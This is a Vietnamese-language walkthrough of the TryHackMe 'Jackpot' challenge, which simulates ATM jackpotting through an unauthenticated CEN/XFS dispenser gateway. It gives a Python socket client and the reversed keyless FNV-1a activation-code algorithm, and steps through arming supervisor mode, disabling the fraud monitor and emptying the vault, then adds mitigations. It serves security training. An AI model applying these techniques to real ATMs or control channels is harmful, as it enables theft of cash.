@@ -1,0 +1,243 @@
+---
+title: 'Jackpot'
+description: 'Phiên bản tiếng Việt: Máy nhả tiền XFS của một ATM nói chuyện qua cổng TCP trần không xác thực; "khoá" duy nhất là một activation code không khoá tính bằng hàm FNV-1a công khai nằm sẵn trong binary hiện trường, nên ta forge quyền supervisor, tắt fraud monitor, và vét sạch két để lấy flag.'
+date: 2026-10-10
+platform: tryhackme
+room: 'Jackpot'
+roomUrl: 'https://tryhackme.com/room/jackpot'
+difficulty: medium
+tags:
+  - 'crypto'
+  - 'reverse-engineering'
+  - 'atm'
+  - 'xfs'
+  - 'network-protocol'
+vulnClasses:
+  - 'missing transport authentication'
+  - 'keyless challenge-response'
+  - 'non-cryptographic hash misuse'
+  - 'security through obscurity'
+  - 'disableable fraud controls'
+translation: done
+draft: false
+---
+
+## **TryHackMe: Jackpot — ATM Jackpotting qua XFS với một Activation Code không khoá**
+
+_Bài hướng dẫn giải challenge "Jackpot" trên TryHackMe. Box mô phỏng một cuộc tấn công ATM kiểu "black box": một module nhả tiền nói giao thức CEN/XFS qua một cổng TCP trần, không xác thực cũng không mã hoá. Phòng thủ duy nhất là một nonce 6 chữ số và một "activation code" supervisor 8 chữ số — nhưng code đó được sinh ra bởi một hàm FNV-1a công khai, không khoá, mà phần hiện thực nằm sẵn trong binary engineering. Ta khôi phục thuật toán, forge supervisor mode không thẻ không PIN, tắt fraud monitor, và vét két tới tờ cuối cùng để nhả flag._
+
+> Flag đã được ẩn. Jackpot là challenge huấn luyện hợp pháp trên TryHackMe; mọi thao tác thực hiện trên mục tiêu luyện tập được phép. Flag hiển thị dạng `THM{<redacted>}`; giá trị thật thu được trên box nhưng được giữ kín ở đây. Các hằng số FNV và chuỗi `ENBANK` là chi tiết thuật toán công khai khôi phục từ binary hiện trường, không phải bí mật — giữ lại vì chúng chính là bài học.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+Cổng `9100` là một **CEN/XFS cash-dispenser (CDM) gateway** **không xác thực tầng kết nối** → banner của nó làm lộ framing của gói và chỉ thẳng tới `GETINFO 0x304`, lệnh này đổ ra **bảng lệnh** đầy đủ (`STATUS`, `DISPENSE`, `ARM`, `SET_MONITOR`, `GET_FLAG`) → `GETINFO 0x301` trả về **trạng thái** máy gồm một **nonce** theo phiên và `flag_released:false` → **activation code** supervisor là `f(nonce)` **không có khoá bí mật** — một biến thể **FNV-1a** công khai mà code chính xác nằm trong binary `jackpot` hiện trường, nên ta tính code hợp lệ **offline** → **ARM** (`EXECUTE 0x4f0`) với code dạng **raw ASCII, không JSON** lật `armed:true` (supervisor mode) → **SET_MONITOR off** (`0x4f1`, phải ARM trước) tắt fraud monitor → **DISPENSE** (`0x401`) tới khi `remaining_notes == 0` — vét sạch két chính là "bằng chứng" làm `flag_released:true` → **GET_FLAG** (`0x4ff`) trả `THM{<redacted>}`.
+
+Không thẻ, không PIN — chỉ là một giọng nói sai trái đang nói tiếng XFS.
+
+</Callout>
+
+### **Mục tiêu**
+
+```text
+export IP=<target-ip>
+```
+
+Lượt quét cho thấy một cổng SSH và hai dịch vụ bất thường — một web console Python và một cổng "jetdirect" thô:
+
+```text
+nmap -sS -p- -T4 --min-rate=1000 $IP
+# 22/tcp   open  ssh
+# 8080/tcp open  http-proxy
+# 9100/tcp open  jetdirect
+
+nmap -sC -sV -p 8080,9100 $IP
+# 8080/tcp open  http  BaseHTTPServer 0.6 (Python 3.12.3)
+#   http-title: Earth's National Bank — Terminal 004 Engineering Console
+# 9100/tcp open  jetdirect?
+```
+
+Web console trên `8080` là một trang "engineering" phát ra một field tool — binary `jackpot`, "Earth's National Bank - Terminal Engineering Tool". Chạy nó biến một session nonce 6 chữ số thành một activation code 8 chữ số:
+
+```text
+file jackpot
+# jackpot: ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped
+
+./jackpot 123456
+# [*] session nonce : 123456
+# [*] activation code: 47384178
+```
+
+Cổng `9100` mới là mục tiêu thực sự. Kết nối tới nó nhận ngay một banner tự mô tả — một "Branch Engineering Gateway (XFS bridge)" nói thẳng định dạng gói cho ta:
+
+```text
+nc $IP 9100
+# {"service":"Branch Engineering Gateway","protocol":"XFS bridge",
+#  "request_format":"1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + <length> bytes of data",
+#  "reply_format":"2 byte big-endian length + <length> bytes of JSON",
+#  "msg_types":{"GETINFO":"0x01","EXECUTE":"0x02"},
+#  "hint":"query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO"}
+```
+
+Đây là một stack **CEN/XFS** mô phỏng — cùng họ API (cash dispenser = **CDM**, `WFS_INF_*` = truy vấn, `WFS_CMD_*` = thực thi) mà mọi ATM thật nói giữa PC và module nhả tiền. Nói chuyện trực tiếp với nó, không có đầu đọc thẻ hay pinpad trong vòng, **chính là** cuộc tấn công ATM "black box" kinh điển.
+
+### **Lỗ hổng — một challenge-response không khoá**
+
+Máy gác "supervisor mode" sau một challenge-response: nó hiện một **nonce** 6 chữ số, và bạn phải trả về **activation code** 8 chữ số khớp. Nhìn thì giống xác thực thật — cho tới khi bạn hỏi bí mật nằm ở đâu.
+
+<Callout type="insight">
+
+Một challenge-response chỉ an toàn khi `response = f(challenge, secret)` và **secret** nằm ở phía server (một khoá HMAC, một khoá ký). Ở đây activation code là `f(nonce)` **không có secret nào** — `f` là một hàm băm **FNV-1a** công khai, tất định (nhận ra qua các hằng số: offset basis `0xcbf29ce484222325`, prime `0x100000001b3`), và phần hiện thực chính xác của nó nằm sẵn trong binary `jackpot` hiện trường. Bất kỳ ai cầm binary đó — hoặc reverse nó — đều tính được code hợp lệ cho **mọi** nonce, offline, không cần chạm tới server. Đây là **security by obscurity**, một vi phạm Kerckhoffs kinh điển: không có khoá nào để giữ, chỉ có một thuật toán chưa bao giờ thực sự được giấu.
+
+</Callout>
+
+Binary là oracle "sự thật" (`./jackpot <nonce>`), nhưng reimplement `f` cho phép tự động hoá toàn bộ chuỗi. Hai tội crypto chồng lên nhau: dùng một **hàm băm phi mật mã** (FNV sinh ra để băm hash table, không phải xác thực) làm auth primitive, và đem phát code của primitive đó ra hiện trường.
+
+### **Bước 1 — Lập bản đồ bảng lệnh XFS (\*\***`GETINFO 0x304`\***\*)**
+
+Theo hint của banner, gửi một `GETINFO` cho command `0x0304` với body rỗng. Mọi request là `[1B msg_type][4B BE command][2B BE length][data]`; mọi reply là `[2B BE length][JSON]`:
+
+```text
+python3 -I -c '
+import socket,struct,json
+s=socket.create_connection(("'"$IP"'",9100),timeout=5)
+def rx(n):
+    b=b""
+    while len(b)<n: b+=s.recv(n-len(b))
+    return b
+json.loads(rx(struct.unpack(">H",rx(2))[0]))            # swallow banner
+s.sendall(b"\x01"+struct.pack(">I",0x0304)+struct.pack(">H",0))
+print(json.loads(rx(struct.unpack(">H",rx(2))[0])))
+'
+# {'rc':'WFS_SUCCESS','device_class':'CDM',
+#  'commands':{'WFS_INF_CDM_STATUS':'0x301','WFS_INF_CDM_CASH_UNIT_INFO':'0x303',
+#              'WFS_INF_CDM_CAPABILITIES':'0x304','WFS_CMD_CDM_DISPENSE':'0x401',
+#              'WFS_CMD_CDM_ARM':'0x4f0','WFS_CMD_CDM_SET_MONITOR':'0x4f1',
+#              'WFS_CMD_CDM_GET_FLAG':'0x4ff'},'max_dispense':40}
+```
+
+Đó là toàn bộ attack surface: một truy vấn trạng thái, một lệnh dispense, một `ARM` (vào supervisor), một `SET_MONITOR` (fraud control), và một `GET_FLAG`.
+
+### **Bước 2 — Đọc trạng thái máy và lấy nonce tươi (\*\***`GETINFO 0x301`\***\*)**
+
+`STATUS` phơi ra các biến nội bộ của máy — quan trọng nhất là `nonce` theo phiên và cờ `flag_released` mà cuối cùng ta cần lật:
+
+```text
+# same framing, command 0x0301
+# {'rc':'WFS_SUCCESS','status':{'nonce':'215120','armed':False,'monitor_on':True,
+#   'locked':False,'screen':'INSERT CARD','remaining_notes':280,'vault_total_notes':280,
+#   'cassettes':[{denom:10,count:100},{denom:20,count:80},{denom:50,count:60},{denom:100,count:40}],
+#   'flag_released':False}}
+```
+
+Toàn bộ challenge thu gọn lại thành việc đưa `flag_released` từ `false` sang `true`. Nonce **xoay theo phiên**, nên phải đọc tươi trong cùng kết nối rồi nạp vào bộ sinh code — không bao giờ hard-code.
+
+### **Bước 3 — Khôi phục thuật toán activation code (FNV-1a)**
+
+Disassemble hàm băm của binary cho thấy FNV-1a chuẩn trên nonce, rồi một vòng thứ hai trên chuỗi `ENBANK` với một bước trộn xorshift mỗi ký tự, lấy mod 1e8 và zero-pad 8 chữ số. Reimplement rồi verify với binary oracle trên các nonce đã biết trước khi tin:
+
+```text
+def activation_code(nonce: str) -> str:
+    h = 0xcbf29ce484222325                                 # FNV offset basis
+    for c in nonce:                                        # pass 1: FNV-1a over the nonce
+        h = ((h ^ ord(c)) * 0x100000001b3) & 0xFFFFFFFFFFFFFFFF
+    for c in "ENBANK":                                     # pass 2: E,N,B,A,N,K
+        h = ((ord(c) ^ h) * 0x100000001b3) & 0xFFFFFFFFFFFFFFFF
+        h = ((h >> 0x1d) ^ h) & 0xFFFFFFFFFFFFFFFF         # xorshift mix (>>29 ^ h)
+    return f"{h % 100000000:08d}"                          # mod 1e8, zero-padded
+
+# verify against the oracle: ./jackpot <nonce>
+# nonce=215120  mine=86961047  binary=86961047  OK
+# nonce=123456  mine=47384178  binary=47384178  OK
+```
+
+Cái bẫy tinh vi nằm ở vòng thứ hai: assembly nạp trước ký tự _đầu tiên_ rồi mỗi vòng tiến tới ký tự _kế tiếp_, nên một bản dịch tay trộn `E,E,N,B,A,N` (bảy giá trị, lặp một `E`) bị lệch một nhịp và cho ra code sai — đó đúng là lý do việc verify với binary trên nhiều nonce lại quan trọng.
+
+### **Bước 4 — ARM vào supervisor mode (DATA raw, không JSON)**
+
+Có code đúng rồi, `ARM` (`EXECUTE 0x4f0`) đáng lẽ mở khoá supervisor mode — nhưng payload JSON hiển nhiên cứ trả `WFS_ERR_CDM_INVALIDCODE`.
+
+<Callout type="note">
+
+**Khi một payload "đúng nội dung" bị từ chối** **_y hệt_** **một payload rỗng, hãy nghi framing/encoding, không phải nội dung.** Gửi code dạng `{"activation_code":"..."}` thất bại y hệt gửi `{}` — bằng chứng server không hề parse JSON của ta. Banner chỉ hứa _reply_ là JSON; **DATA của request là bytes thô**. `ARM` muốn đúng 8 ký tự ASCII của code (ví dụ `b"86961047"`), `SET_MONITOR` muốn `b"off"`, `DISPENSE` muốn số tờ dạng ASCII. Đọc lại đặc tả; đừng mặc định JSON ở cả hai chiều.
+
+</Callout>
+
+Gửi code dạng raw ASCII và máy arm:
+
+```text
+# EXECUTE=0x02, ARM=0x4f0, DATA = raw ASCII code (read a FRESH nonce first)
+s.sendall(b"\x02"+struct.pack(">I",0x04f0)+struct.pack(">H",8)+code.encode())
+# {'rc':'WFS_SUCCESS','detail':'armed - supervisor mode'}  -> status armed=True
+```
+
+### **Bước 5 — Tắt fraud monitor (thứ tự quan trọng)**
+
+Đã armed, lần dispense đầu OK, nhưng lần thứ hai kích một fraud monitor (`monitor_on:true`) khoá máy (`WFS_ERR_CDM_LOCKED`, \~45s) vì một "anomalous dispense with null transaction id". Ta tắt nó bằng `SET_MONITOR`, nhưng chỉ sau khi đã arm:
+
+```text
+# SET_MONITOR before ARM -> WFS_ERR_CDM_NOTARMED  (a precondition error, not a content error)
+# SET_MONITOR after ARM:
+s.sendall(b"\x02"+struct.pack(">I",0x04f1)+struct.pack(">H",3)+b"off")
+# {'rc':'WFS_SUCCESS','monitor_on':False}
+```
+
+Cái deadlock bề ngoài (monitor chặn dispense, mà tắt monitor lại cần quyền) không phải deadlock: `ARM` bị gác bởi _code_, không phải bởi monitor, nên thứ tự bắt buộc chỉ là **ARM trước, rồi SET_MONITOR off**. Các mã lỗi khác nhau (`NOTARMED` ≠ `INVALIDCODE`) mới là thứ hé lộ sự phụ thuộc. Một khi vào supervisor mode, kẻ tấn công tắt luôn chính cái kiểm soát được dựng lên để bắt mình.
+
+### **Bước 6 — Vét sạch két để nhả flag**
+
+`GET_FLAG` cứ trả "no proof of cashout on record" ngay cả sau các lần dispense thành công, vì dispense của ta mang null transaction id và không lần nào được tính là bằng chứng. DATA của `DISPENSE` chỉ là số tờ, và không có cách nào gán transaction id — nên bằng chứng đúng ý là một jackpot _thật_: vét cạn két.
+
+<Callout type="note">
+
+Điều kiện ra flag không phải "một giao dịch hợp lệ" mà là **`dispensed_total == vault_total_notes`** — máy phải nhả ra _mọi_ tờ. Với fraud monitor đã tắt, không gì cản một vòng lặp `DISPENSE 40` tới khi `remaining_notes` về `0`; đúng lúc đó `flag_released` lật sang `true`. Đó chính là đúng nghĩa đen của _jackpotting_: ATM tự làm rỗng chính mình.
+
+</Callout>
+
+```text
+# loop: read STATUS.remaining_notes, DISPENSE min(remaining,40) as ASCII, until 0
+#   DISPENSE 40 notes ... remaining 240 ... 200 ... -> 0
+# status: dispensed_total=280  flag_released=True  screen='SUPERVISOR MODE'
+
+# EXECUTE 0x4ff GET_FLAG
+# {'rc':'WFS_SUCCESS','flag':'THM{<redacted>}'}
+```
+
+Banner → bảng lệnh → nonce tươi → code forge → ARM (raw) → monitor off → vét sạch két → flag. Mỗi bước đọc một biến trạng thái và lật đúng cái nó cần.
+
+### **Impact**
+
+<Callout type="critical">
+
+**Critical — rút tiền không xác thực khỏi máy nhả.** Một điểm đại diện là **CVSS 3.1 9.3** (`AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`): bất kỳ ai tiếp cận được kênh điều khiển của dispenser (một vụ đấu dây ATM "black box") đều có thể tạo quyền supervisor và vét sạch két, không thẻ, không PIN, không giao dịch hợp lệ. Các thất bại phản chiếu jackpotting ngoài đời (Ploutus, Cutlet Maker):
+
+- **Không xác thực hay mã hoá tầng truyền** trên kênh điều khiển CDM — trust model XFS cho rằng mọi caller đều là phần mềm nội bộ đáng tin.
+- **Một challenge-response không khoá** — "activation code" là một hàm thuần của nonce không secret phía server, nên nó chẳng xác thực gì.
+- **Một hàm băm phi mật mã (FNV-1a) dùng cho xác thực**, với phần hiện thực phát ra trong binary hiện trường — security by obscurity mà chưa bao giờ obscure.
+- **Một fraud monitor attacker tắt được** — kiểm soát chống gian lận có thể bị tắt bởi chính phiên supervisor mà nó đáng lẽ giám sát.
+
+</Callout>
+
+### **Khắc phục đề xuất**
+
+<Callout type="fix">
+
+1. **Xác thực và mã hoá kênh điều khiển.** Chuyển khỏi XFS cũ sang một transport có xác thực (ví dụ XFS4IoT trên TLS/WebSocket), xác thực lẫn nhau giữa host và dispenser, và cách ly vật lý/logic đường PC-đến-CDM để một black box không nói chuyện được với nó.
+2. **Dùng challenge-response có khoá.** Tính response supervisor bằng HMAC hoặc chữ ký số trên nonce, với khoá giữ trong HSM/secure element — không bao giờ là một hàm băm trần, và không bao giờ để khoá hay thuật toán nằm trong một field tool.
+3. **Không bao giờ dùng hàm băm phi mật mã cho xác thực.** FNV/CRC và đồng bọn dành cho hash table và checksum; xác thực cần một MAC có khoá hoặc chữ ký.
+4. **Làm fraud control tamper-evident và độc lập.** Giám sát và journaling phải append-only, báo cáo ra ngoài, và không tắt được từ chính phiên operator/supervisor mà chúng giám sát.
+
+</Callout>
+
+### **Bài học rút ra**
+
+- **Một challenge-response không secret chỉ là diễn kịch.** Nếu response là một hàm thuần của challenge, và hàm đó công khai (hoặc nằm trong binary), thì chẳng có gì để xác thực — lại là Kerckhoffs.
+- **Đọc giao thức mà dịch vụ trao cho bạn.** Banner đã cho framing và lệnh đầu tiên; chiến thắng nằm ở việc đọc kỹ, không phải bắn payload bừa.
+- **Thất bại giống hệt nhau chỉ về format, không phải nội dung.** Một code đúng bị từ chối y hệt một body rỗng nghĩa là server bỏ qua JSON của ta — DATA là bytes thô ngay từ đầu.
+- **Verify một thuật toán đã reverse bằng oracle.** Lỗi off-by-one của vòng `ENBANK` chỉ lộ ra khi bạn đối chiếu bản hiện thực của mình với binary thật trên nhiều nonce.
+- **Chống gian lận mà tắt được thì không phải chống gian lận.** Kiểm soát mà attacker có thể tắt sau khi lên quyền chẳng mua được gì; giám sát phải độc lập và tamper-evident.
+
+Cảm ơn bạn đã đọc. Jackpot là một mô hình gọn gàng của các cuộc tấn công ATM black-box thật: bóc đi thẻ và PIN, bạn còn lại một dispenser XFS lắm lời mà khoá duy nhất là một hàm băm không khoá — khôi phục thuật toán, nói đúng giao thức, và két tự làm rỗng chính mình.
